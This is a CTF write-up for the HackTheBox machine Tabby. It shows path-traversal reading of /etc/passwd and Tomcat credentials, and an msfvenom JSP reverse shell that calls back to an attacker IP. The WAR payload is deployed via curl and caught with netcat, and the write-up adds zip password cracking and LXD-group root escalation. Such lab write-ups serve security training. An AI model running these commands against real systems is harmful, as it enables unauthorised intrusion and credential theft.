---

title: HackTheBox - Tabby
layout: post
date: 2020-11-07 23:00:00 +0800

---

![41b0e42c710a3995c7aa895d7553bb43.png](/images/htb-tabby/51c8692db8f7476280696d902b7ec465.png)

### 0. Preface

This is the first box I ever done on HackTheBox. This write-up is also one of the very first I've written. This is a very interesting box, especially the root privilege escalation.

In this box, we will be tackling: 

1. LFI
2. Using Tomcat's manager-script via curl commands to upload an exploit
3. Exploiting the laziness of system administrators
4. Using LXD to get root

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -O -oN nmap.txt 10.10.10.194 -p- -v
```

![f2ce3401b394547f79f1a5783fbf0257.png](/images/htb-tabby/19c9fc8d9025464988bc4bf6a4894aec.png)

This seems to be an Ubuntu box that is running Tomcat. 

### 2. Website LFI 

Let's access the website on `http://10.10.10.194`.

![5bd0fcc67c821a28c1d98c9afa3a96a5.png](/images/htb-tabby/5f90abd8896a481a9bd7ba34a43b65f4.png)

Seems like a normal VPS hosting service. Let's see what that data breach thing is all about. 

![3e1e863cc8452ce1d04b34a01443dc34.png](/images/htb-tabby/219f6ceca24947b38f5224748ff5db28.png)

Let's add an entry to the our hosts file pointing the IP address to `megahosting.htb` before we continue. 

![fca1e834bc6178153aaa0f5a0f71413d.png](/images/htb-tabby/e0ef2da0e08a4abdb6d1a1dac7312a21.png)

And we got the correct page this time.

![e92b652f5d001804f88808a144a5d50c.png](/images/htb-tabby/266276266ec746429d30890d9b14396a.png)

Notice in the URL that it appears to be reading from a file called statement? Let's see if we can do LFI with that. 

We can easily do it with dotdotpwn, but if you are feeling adventurous, you can attempt to do it manually. 

```bash
dotdotpwn -h 10.10.10.194 -m http-url -k "root" -u 'http://megahosting.htb/news.php?file=TRAVERSAL' -b
```

![7ba4f3535df6842212cf9204eb392528.png](/images/htb-tabby/d1287486b5014a628ef87aa0cf8e3630.png)

And we found something. Before we continue, let's move over to Burpsuite to make it easier to view output.

![65139baaf5c371a100431504e2bcb454.png](/images/htb-tabby/8cb4de9ab4e745c480aea206d7096b14.png)

So we got the list of users on the machine. Awesome. 

Next, let's check out the tomcat page on `megahosting.htb:8080`.

![fa3a2c5666017f530a48cb38908a4455.png](/images/htb-tabby/bf4e1f2dc389445aa4a967bd4987c0fd.png)

Let's see if we can't read `/etc/tomcat9/tomcat-users.xml`, where the credentials are stored according to the Tomcat default page.

![50fed89df4a981c716346668530b8c69.png](/images/htb-tabby/d6a3b7c3e9db48dca672579e0aefa082.png)

No luck. So let's take a look what directories/files are included in tomcat9 from the [Debian package maintainer](https://packages.debian.org/buster/all/tomcat9/filelist).

![c9093591db8394b577acfe9122795096.png](/images/htb-tabby/89c13e45b96548069053fbe18880126e.png)

There is actually a tomcat-users.xml in the `/usr/share/tomcat9/etc/` directory. Let's try reading that instead.

![78000dabd8de905d5d430de423226387.png](/images/htb-tabby/ad7f5e7a16a54e58a462480fa9ee156f.png)

And there we go. We have a username and a password. Take note of what permissions the tomcat user has (admin-gui and manager-script)

Do read up on the [tomcat9 documentation](https://tomcat.apache.org/tomcat-9.0-doc/index.html) to see what both roles are able to provide, as well as for understanding what's going on in the next section. 

### 3. Reverse Shell Using MSFVenom

Now that we got the credentials, let's try logging into the host-manager gui, which the admin-gui role allows us to do.

![9b8460f1f8ff0ee2c1bc08ccd479be80.png](/images/htb-tabby/27cd346a9c9948acac6c7737c9b0139c.png)

Honestly, there's nothing much we can do here, so let's move on to the manager-script role.

Using this role, we are able to use curl to upload web applications (packaged as .war files) to tomcat, even if we do not have access to the GUI. 

Let's create a .war application using msfvenom to pop our reverse shell: 

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.43 LPORT=8000 -f war > wartime.war
```

![cbc34d1e4db6cc0c38aeda152331fa45.png](/images/htb-tabby/d95c24ad794a4fca8dd7ac3d8311b097.png)

Be sure to change the LHOST and LPORT values to match your local machine. 

Next, let's upload the .war file using

```bash
curl -u tomcat -T /path/to/web/app/wartime.war http://megahosting.htb:8080/manager/text/deploy?path=/wartime
```

A couple of things to note: 
1. this **does not** support HTTP POST requests. 
2. Use HTTP PUT to upload the file instead.
3. Also take note of the `/` in front of the deployment path.

![014582821bc5cfcbf638af6f1c59446d.png](/images/htb-tabby/0aa119338ea94e2184e15fa1feb41a0f.png)

If you make a mistake with the LHOST or LPORT, you can undeploy the .war file using: 

```bash
curl -u tomcat http://megahosting.htb:8080/manager/text/undeploy?path=/wartime
```

![1992c9c407679a0685cdd1ecc069000b.png](/images/htb-tabby/fb8a5394582d4e4bbdfea4159b54925d.png)

Once we have successfully uploaded the .war file, prepare to catch the shell with `nc -lvnp 8000`. We can trigger the shell by navigating to `http://megahosting.htb:8080/wartime`

![a856c943e679e41a7896c610630e6d02.png](/images/htb-tabby/85581c3234cb4ebfbd331f349faa7abd.png)

Let's upgrade this to an interactive shell with python before continuing. 

![a60da37e3b245b0b823863dae6811709.png](/images/htb-tabby/d15e7b7afdfe4e97acc0f6c355f6a08a.png)

### 4. Enumeration and User Flag

Now that we have an interactive shell, let's see what we can find. 

Let's first check out the `/var/www` folder.

![8b8b71369cde537b4bdd5dc41ed905cd.png](/images/htb-tabby/48581a807b5a44ef84d994867b60bce9.png)

Interesting. There's a backup zip. Let's see if we can't unzip it. 

![3c12a42b3509651789ac6918c8ca0b2d.png](/images/htb-tabby/f00c98eb89c144ff8bf071238e4e7152.png)

No luck. The .zip is password protected. Let's setup a HTTP server here using python, then download the .zip to our local machine. 

![67b17754c36a4ae1966363bc19abf25e.png](/images/htb-tabby/ced9d0427b514989a1a49a88b3c5b1dd.png)

Right... Now let's try to crack the password using JohnTheRipper. To do so, first use `zip2john 16162020_backup.zip >> hashes.txt` to extract the hashes from the zip file. 

Once we got the hashes, let's crack it using 

```bash
sudo john --wordlist:/usr/share/wordlists/rockyou.txt hashes.txt
```

And we got the password. 

![b641510c6656b871db0f10188f06b01c.png](/images/htb-tabby/10dd8dc886c34185bb5f68c6a084e349.png)

Let's unzip the backup and see what's in there.

![ae475a6e5586c2edfab7c69c92e5e7dd.png](/images/htb-tabby/93a55ed17b694b0a8b93983fb32d4674.png)

Nothing too interesting, so back to the shell. The file seems to be owned by a user called ash. That's what who we want to escalate to, so let's try to `su ash` using the .zip password.

![db9c94a1154f1cf8ea74c5fd8fb06ab6.png](/images/htb-tabby/1b26981d7c0141f8b15cba8db1bcd42f.png)

And we got it. Let's grab the user flag. 

![57953a697caefc693e97055ee9cac8a2.png](/images/htb-tabby/26459080603e4db8861ce32043b4a185.png)

### 5. Privilege Escalation With LXC

Looking at the `id` for ash, we see that it is in a group called lxd.

![6b6b256ebe13c3090c17eb57ac74ba82.png](/images/htb-tabby/c965429dc559427d98247e51dbd24f06.png)

So after a bit of Googling, we find that lxd is LinuX Daemon, which is used as a Linux 'Lightervisor', a lightweight hypervisor. 

*Which kinda makes sense, since this is a VPS hosting company.*

So how can we exploit this? After more Google-fu, I found [this exploit](https://github.com/initstring/lxd_root) that allows any user inside the lxd group to get root permissions.

For this exploit to work, we have to get a lxc container going first, so let's read up more. 

To create an lxc container, the recommended way is to simply download the image from the Internet using `lxc launch ubuntu:14.04 ubuntu-image`. 

But this box does not have an Internet connection, so we need to do it the manual way. Let's first download one of the smallest Linux distributions around - [Alpine Linux](https://www.alpinelinux.org). 

Next, following [this guide](https://ubuntu.com/tutorials/create-custom-lxd-images#4-creating-a-metadata-file), create a metadata.yaml file and compress it into a tarball using `tar -cvzf metadata.tar.gz metadata.yaml`

*Note that we do not have to compress the Alpine Linux image into a tarball as it already comes in a tarball.*

Next, setup a HTTP server using `python3 -m http.server 8888` and download both the Alpine image and the metadata file to the remote server.

![c3043cebd91c4f9d8e6fd800c5b9ed03.png](/images/htb-tabby/9bc792f3ef3c4d24a0d88c9c28a4d17b.png)

Now we are ready to upload and spin up the image using 

```bash
lxc image import metadata.tar.gz alpine.tar.gz --alias alpine
```

![57d40036f6676c652ff404820afb11e0.png](/images/htb-tabby/bb9f2312dc884133b524a5e523143b3e.png)

*Note: if you get an error saying that it's the first time running lxd, run `lxd init` and leave all the options default.* <br/>

![c4939cf4e03185568a0f68f179784e66.png](/images/htb-tabby/89780c8e1dd54807914b9bc1b753ee00.png)

Let's launch this using 

```bash
lxc launch alpine
```

![05987fdf46d5f020367432b4fe2c22f5.png](/images/htb-tabby/29ee8e33ac024dc4951955e3b5150680.png)

Alright, so let's upload the exploit found earlier (can use either the .py or the .sh version, both are the same) to the machine. 

![02c31d7fe76ab961e916c7cc47cdf78d.png](/images/htb-tabby/8d893fcc22ba4ad1bc835de3d0cf3b01.png)

Make sure to `chmod +x` the file. Running the script, it will prompt us to enter a container name.

![2f7ceb5cf02420289ab76b88bbb2787d.png](/images/htb-tabby/d78af2ec33924d65b9ff51cdb69eccb9.png)

Let's run `lxc list` to view the currently running containers and get our container name.

![9f2cdf966d988050424938d13875a2aa.png](/images/htb-tabby/f2d8f607b9a3409ab84c2e3d6bbf4e15.png)

Next, let's run the exploit again with the container name appended. 

![d36dd0cbf8bb4653caaaf482fe1687ea.png](/images/htb-tabby/3c9a0479027c49a288a176bf1dde0913.png)

Awesome. Now we have root privileges.

![8dd2eb60f2a074ac6e030da29d18287d.png](/images/htb-tabby/269c69cfa886423abb89ea1d5e2ca7f7.png)